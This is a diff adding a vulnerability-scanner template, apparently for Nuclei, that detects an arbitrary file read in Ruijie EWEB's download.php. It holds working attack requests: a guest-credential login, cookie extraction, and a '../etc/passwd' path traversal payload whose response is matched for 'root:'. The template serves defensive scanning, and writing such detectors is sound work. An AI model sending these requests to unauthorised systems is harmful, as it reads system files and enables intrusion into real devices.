@@ -1,0 +1,54 @@
+id: ruijie-eweb-download-anyfile-read
+
+info:
+  name: Ruijie EWEB Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,eweb
+  description: |
+    This template detects an arbitrary file read vulnerability in Ruijie EWEB's download.php endpoint.
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=guest&password=guest?
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: ruijie_cookie
+        internal: true
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+
+  - raw:
+      - |
+        POST /download.php?a=readFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: RUIJIEID={{ruijie_cookie}}; user=guest
+
+        name=../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
